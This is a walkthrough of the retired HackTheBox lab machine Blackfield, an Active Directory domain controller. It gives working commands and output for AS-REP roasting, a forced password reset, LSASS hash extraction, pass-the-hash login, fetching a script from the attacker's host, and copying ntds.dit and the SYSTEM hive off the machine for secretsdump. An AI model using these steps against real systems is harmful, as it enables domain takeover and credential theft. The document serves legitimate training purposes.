---
layout: walkthrough
title: HackTheBox - Blackfield
date: 2020-10-04 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/blackfield.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this post forms part of my challenge VM writeups. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Blackfield --`10.10.10.192`-- from HackTheBox. In order to start the VM, I need begin with the Information gathering phase.

## Information Gathering

Let's begin with a Nmap Scan.

### Nmap Output
<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Blackfield$ nmap -sC -sV 10.10.10.192 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 08:35 EDT
Nmap scan report for 10.10.10.192
Host is up (0.20s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-28 19:42:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=9/28%Time=5F71D8B0%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h06m34s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-09-28T19:44:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.00 seconds
```

</details>

From the output shown above, we can see that the machine is a Windows domain controller, and I added `BLACKFIELD.LOCAL` to the `/etc/hosts` file. Since it's a domain controller, I generally start of with some basic unauthenticated LDAP queries in order to get more information about the machine. I created a [ldap-query](https://github.com/KyhleOhlinger/PentestScripts/blob/master/Bash%20Scripts/ldap.sh) script a while ago, and I'm going to be making use of it during the enumeration phase. 

### LDAP-Enumeration:

The actual command that was run for `DNS Server Enumeration` is shown below: 

```bat
ldapsearch -LLL -x -H ldap://$1 -b '' -s base '(objectclass=*)' ;;
```

<details>

```bat
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=BLACKFIELD,DC=local
ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime                                                                            
supportedLDAPPolicies: MaxPageSize                                                                                
supportedLDAPPolicies: MaxBatchReturnMessages                                                                     
supportedLDAPPolicies: MaxQueryDuration                                                                           
supportedLDAPPolicies: MaxDirSyncDuration                                                                         
supportedLDAPPolicies: MaxTempTableSize                                                                           
supportedLDAPPolicies: MaxResultSetSize                                                                           
supportedLDAPPolicies: MinResultSets                                                                              
supportedLDAPPolicies: MaxResultSetsPerConn                                                                       
supportedLDAPPolicies: MaxNotificationPerConn                                                                     
supportedLDAPPolicies: MaxValRange                                                                                
supportedLDAPPolicies: MaxValRangeTransitive                                                                      
supportedLDAPPolicies: ThreadMemoryLimit                                                                          
supportedLDAPPolicies: SystemMemoryLimitPercent                                                                   
supportedControl: 1.2.840.113556.1.4.319                                                                          
supportedControl: 1.2.840.113556.1.4.801                                                                          
supportedControl: 1.2.840.113556.1.4.473                                                                          
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=lo
 cal
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=BLACKFIELD,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=BLACKFIELD,DC=local
namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
isSynchronized: TRUE
highestCommittedUSN: 209012
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
dnsHostName: DC01.BLACKFIELD.local
defaultNamingContext: DC=BLACKFIELD,DC=local
currentTime: 20200928195757.0Z
configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local
```

</details>

We didn't get much more from the unauthenticated LDAP enumeration, so let's dive into the enumeration phase of the machine. We know that RPC is open, but an unauthenticated RPC session `rpcclient 10.10.10.192 -U ''` doesn't allow us to enumerate any information. We know that we have SMB open as well, so I decided to look into that as an avenue of attack.

## Unauthenticated Enumeration

### SMB Enumeration

<details>

```bat 
vagrant@ko:~/Desktop/HackTheBox/Blackfield$ smbclient -L \\10.10.10.192
Enter WORKGROUP\vagrant's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

</details>

The SMB enumeration with smbclient shows us two non-default shares, namely; `forensic` and `profiles$`. When attempting to access `forensic`, we get listing is denied as shown below:

<details>
```bat
vagrant@ko:~/Desktop/HackTheBox/Blackfield$ smbclient //10.10.10.192/forensic
Enter WORKGROUP\vagrant's password: 
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

</details>

Trying the same thing for the `profiles$` share provides us with a large list of potential usernames. 

### ASRep Roasting

After copying the names to text file, I decided to try use ASRep Roasting to see if we could retrieve a password hash from an unauthenticated perspective, since at this point we still don't have any way of interacting with the host in an authenticated manner. 

<details>

```python

python GetNPUsers.py 10.10.10.192 -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

<-- Snipping -->

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                     
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set 

<-- Snipping -->

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

<-- Snipping -->

$krb5asrep$23$support@BLACKFIELD.LOCAL:379ca18a5c41b65c9ac310e4316ba4a7$4780fe2da5c68c10625ec575ff1d3bc46c732c91e9a617cab9406277a80693e60f7485fcbd9c258df2bf821d8b1db7bf0474523b86b656f28b7b4423a853ba2150a9c7846f4d8152c08989f1bd9624ff09b92cac140ec57d2a580730697dd70022518619ab534f342266ce34bfe0037d1a36e2f1fb9d163e96ba7496fabe4ef7b4321e66ca0e289a585411b0813e54d635402dca9d5f8a9a85454ddd45fe6efd7fca544ce5ee02b024eecde4992246be694d760544a706897be0ccebed4ee38a8574d306c42d7e8fdf98b2207450486de62da6da13d1d355e60947c49ce8e9280ce7b22e6598aeb0d1d93529c59c89aa7dcf66af
```

</details>

The output shown above has most of the irrelevant information removed. What was interesting is that 2 accounts, `audit2020` and `svc_backup` did not have the "Don't Require Preauth" flag set, which was a different error to the others which just stated that the user doesn't exist. The `support` user did in fact have the "Don't Require Preauth" flag set which meant that we were able to retrieve the password hash and feed it into hashcat using the following command:

```bat
hashcat -m 18200 --force -a 0 hashes.asreproast hashes.asreproast
```

## Authenticated Enumeration

### RPC Enumeration

We managed to crack the password: `#00^BlackKnight` and now we have a way to do enumeration from an authenticated perspective on the machine. I started off with RPC to determine if we can find out any more interesting information about the domain. The commands that I used are shown below, for a description of the commands, please look at the [manpages](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html):
* enumdomusers
* enumdomgroups
* enumalsgroups domain
* enumprivs
* lsaenumsid

<details>

```bat

vagrant@ko:~/Desktop/HackTheBox/Blackfield$ rpcclient -U support -W BLACKFIELD.LOCAL  10.10.10.192
Enter BLACKFIELD.LOCAL\support's password:                                                                        
rpcclient $> enumdomusers                                                                                         
user:[Administrator] rid:[0x1f4]                                                                                  
user:[Guest] rid:[0x1f5]                                                                                          
user:[krbtgt] rid:[0x1f6]                                                                                         
user:[audit2020] rid:[0x44f]                                                                                      
user:[support] rid:[0x450]  
user:[BLACKFIELD764430] rid:[0x451]                                                                               
user:[BLACKFIELD538365] rid:[0x452]                                                                               
user:[BLACKFIELD189208] rid:[0x453]                                                                               
user:[BLACKFIELD404458] rid:[0x454]     

<-- Snipping -->

user:[BLACKFIELD532412] rid:[0x581]                                                                               
user:[BLACKFIELD996878] rid:[0x582]                                                                               
user:[BLACKFIELD653097] rid:[0x583]                                                                               
user:[BLACKFIELD438814] rid:[0x584] 
user:[svc_backup] rid:[0x585]                                                                                     
user:[lydericlefebvre] rid:[0x586]  


rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]


rpcclient $> enumalsgroups domain
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]


rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)


rpcclient $> lsaenumsid
found 17 SIDs

S-1-5-90-0
S-1-5-9
S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
S-1-5-80-0
S-1-5-6
S-1-5-32-559
S-1-5-32-554
S-1-5-32-551
S-1-5-32-550
S-1-5-32-549
S-1-5-32-548
S-1-5-32-545
S-1-5-32-544
S-1-5-20
S-1-5-19
S-1-5-11
S-1-1-0
S-1-5-21-4194615774-2175524697-3563712290-1104
```

</details>

Using this method, we managed to gather more information about the domain; we retrieved another potential user: `lydericlefebvre`, we managed to get a list of domain groups along with their aliases -- even though they seemed pretty standard, and we retrieved a number of privileges which could come in handy for privilege escalation. I tried running the new user list through ASRep Roast again, but we didn't get any new hashes. From there I tried enumerating the user a bit more:

<details>

```bat
rpcclient $> queryuser support
        User Name   :   support
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 02 Oct 2020 22:43:12 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Sun, 23 Feb 2020 12:53:24 EST
        Password can change Time :      Mon, 24 Feb 2020 12:53:24 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000009
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient $> getusrdompwinfo 0x450
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE



rpcclient $> lookupnames support
support S-1-5-21-4194615774-2175524697-3563712290-1104 (User: 1)

rpcclient $> lookupsids S-1-5-21-4194615774-2175524697-3563712290-1104
S-1-5-21-4194615774-2175524697-3563712290-1104 BLACKFIELD\support (1)

rpcclient $> lsaenumprivsaccount S-1-5-21-4194615774-2175524697-3563712290-1104
result was NT_STATUS_OBJECT_NAME_NOT_FOUND

rpcclient $> lsaenumacctrights S-1-5-21-4194615774-2175524697-3563712290-1104
result was NT_STATUS_OBJECT_NAME_NOT_FOUND
```

</details>

## Lateral Movement
### Lateral Movement using Support

Unfortunately, all we know about the user is that it is part of Domain Users group since the `group_rid` is set to `0x201`. After some more enumeration through the use of Bloodhound, I eventually found out that the `support` user has the required permissions to change the `audit2020` user's password:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Blackfield/bloodhound.png"  style="width: 100%" />
</p>

In order to achieve this we can use the following RPC command:

```bat
rpcclient $> setuserinfo2 audit2020 23 <NewPassword>
```

### Lateral Movement using Audit2020

Now that we have access to the `audit2020` account, we can try authenticating to SMB again and see if we finally have access to the `forensic` directory. 

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Blackfield$ smbclient //10.10.10.192/forensic --user=audit2020 --workgroup=blackfield.local
Enter BLACKFIELD.LOCAL\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3998664 blocks available

```

</details>

We did end up having access to this directory so I pulled the contents of this SMB share and started looking through the files and directories. Within the `memory_analysis` directory I found something that seemed slightly out of place, namely; `lsass.zip`. I unzipped the folder and had access to an LSASS dump file, so I searched for ways to retrieve the information from Linux and stumbled across [this blog post](https://en.hackndo.com/remote-lsass-dump-passwords/). I decided to make use of `pypykatz` by using the following command:

```bat
pypykatz lsa minidump lsass.dmp
```

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Blackfield/audit2020$ pypykatz lsa minidump lsass.DMP                             
INFO:root:Parsing file lsass.DMP                                                                                  
FILE: ======== lsass.DMP =======                                                                                  
== LogonSession ==                                                                                                
authentication_id 406458 (633ba)                         
session_id 2                                                                                                      
username svc_backup                                      
domainname BLACKFIELD                                                                                             
logon_server DC01                                                                                                 
logon_time 2020-02-23T18:00:03.423728+00:00                                                                       
sid S-1-5-21-4194615774-2175524697-3563712290-1413                                                                
luid 406458                                                                                                       
        == MSV ==                                                                                                 
                Username: svc_backup                                                                              
                Domain: BLACKFIELD                                                                                
                LM: NA                                                                                            
                NT: 9658d1d1dcd9250115e2205d9f48400d                                                              
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c                                                    
        == WDIGEST [633ba]==                                                                                      
                username svc_backup                                                                               
                domainname BLACKFIELD                                                                             
                password None                                                                                     
        == SSP [633ba]==                                                                                          
                username                                                                                          
                domainname                                                                                        
                password None                                                                                     
        == Kerberos ==                                                                                            
                Username: svc_backup                                                                              
                Domain: BLACKFIELD.LOCAL                 
                Password: None                                                                                    
        == WDIGEST [633ba]==                                                                                      
                username svc_backup                                                                               
                domainname BLACKFIELD                                                                             
                password None  
                
<-- Snipping -->
               
               
       == DPAPI [3e7]==                                                                                          
                luid 999                                                                                          
                key_guid f7e926c-c502-4cad-90fa-32b78425b5a9                                                      
                masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d46
1676475b24be001736f920cd21637fee13dfc616                                                                          
                sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd                                           
        == DPAPI [3e7]==                                                                                          
                luid 999                                                                                          
                key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654                                                     
                masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775
fcde2740ae7207526ce493bdc89d2ae3eb0e02e9                                                                          
                sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477                                           
        == DPAPI [3e7]==                                                                                          
                luid 999                                                                                          
                key_guid 31632c55-7a7c-4c51-9065-65469950e94e                                                     
                masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5
b109678e8e2337d76d4e38e390d8b980fb737edb                                                                          
                sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01                                           
        == DPAPI [3e7]==                                                                                          
                luid 999                                 
                key_guid 7e0da320-72c-4b4a-969f-62087d9f9870                                                      
                masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75
ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5                                                                          
                sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed    

```

</details>

As with the other output, I snipped most of the irrelevant information. From the LSASS dump we got the NT hash for the `svc_backup` user -- `9658d1d1dcd9250115e2205d9f48400d`. 

### Lateral Movement using svc_backup

Now that we have the NT hash for the `svc_backup` user, we can try once again to get a foothold on the machine. For this I decided to make use of [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

<details>

```powershell
vagrant@ko:~/Desktop/HackTheBox/Blackfield/evil-winrm$ ruby evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents>

```

</details>

Success! We now have a foothold (and the user.txt file) on the machine and can start some more information gathering at this stage. Navigating to the `C:` directory I came across a `notes.txt` file:

<details>

```powershell
*Evil-WinRM* PS C:\> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

</details>

## Privilege Escalation

With access to the host, we can now run some basic information gathering against the user account.

<details>

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/2/2020 9:08:13 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /all
                            
USER INFORMATION
---------------- 
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

</details>

If you recall, the `notes.txt` file contained the line `We will probably have to backup & restore things later`. Looking at the `PRIVILEGES INFORMATION`, we have the `SeBackupPrivilege` and `SeRestorePrivilege` privileges enabled for the account so I'm pretty sure that we will need to use this method for privilege escalation. This [presentation](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf) by Andrea Pierini provides a fantastic overview of whoami privileges and I would highly recommend reading through the slides if you have the time. 


According to the slides, the `SeBackupPrivilege` has the following attributes associated with it:

> Allows the user to circumvent file and directory permissions to backup the system. The privilege is selected only when the application attempts to access through the NTFS backup application interface. Otherwise normal file and directory permissions apply.” 
> With this privilege you can easily backup Windows registry and use third party tools for extracting local NTLM hashes

> Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe”

From the description, we know that we should be able to create a backup of the `NTDS.dit` file which we can then dump the contents locally. First we need to ensure that we have full control over the NTDS.dit file:

<details>

```powershell
$NTDS = "C:\Windows\NTDS\ntds.dit"
$acl = Get-Acl $NTDS
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("blackfield.local\svc_backup","FullControl","Allow")
$acl.SetAccessRule($AccessRule)
$acl | Set-Acl $NTDS


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Get-acl $NTDS | select -expand accesstostring
BLACKFIELD\svc_backup Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl

```

</details>

In order to create a backup we can use the following commands which were taken from the slides above.

<details>
```bat
set context persistent nowriters#
add volume c: alias hotshoto#
create#
expose %hotshoto% z:#
```

</details>
 
In order to get the file onto the host, I used the following PowerShell command:

```powershell
Invoke-WebRequest "http://10.10.15.57/shadow.txt" -OutFile "shadow.txt"
```

Now that the file is on the machine, we can use *diskshadow* to read in the file and create a backup in the `Z:` drive.

<details>

```powershell
*Evil-WinRM* PS C:\temp> diskshadow.exe /s shadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/2/2020 10:04:12 PM

-> set context persistent nowriters
-> add volume c: alias hotshoto
-> create
Alias hotshoto for shadow ID {094aa50e-c1eb-4daf-b335-b2b631a7611e} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {97a10120-9375-41c3-98f8-b0fc8f94582e} set as environment variable.

Querying all shadow copies with the shadow copy set ID {97a10120-9375-41c3-98f8-b0fc8f94582e}

        * Shadow copy ID = {094aa50e-c1eb-4daf-b335-b2b631a7611e}               %hotshoto%
                - Shadow copy set: {97a10120-9375-41c3-98f8-b0fc8f94582e}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/2/2020 10:04:13 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %hotshoto% z:
-> %hotshoto% = {094aa50e-c1eb-4daf-b335-b2b631a7611e}
The shadow copy was successfully exposed as z:\.
->

```
</details>

Success! The file was successfully backed up. In order to dump the contents locally, we need to move the file onto our Kali machine along with a backup of the system file which contains the boot key. The boot key within the SYSTEM hive is required to decrypt the contents of the NTDS file. The commands used are shown below:

<details>

```powershell

*Evil-WinRM* PS Z:\Windows\NTDS> download ntds.dit
Info: Downloading Z:\Windows\NTDS\ntds.dit to ntds.dit

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\temp> reg save hklm\system system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\temp> download system.bak
Info: Downloading C:\temp\system.bak to system.bak

                                                             
Info: Download successful!

```

</details>

With the files on the Kali machine, I used the following command to dump the contents of the NTDS.dit file:

```python
python3 secretsdump.py -ntds ntds.dit -system system.bak LOCAL    
```

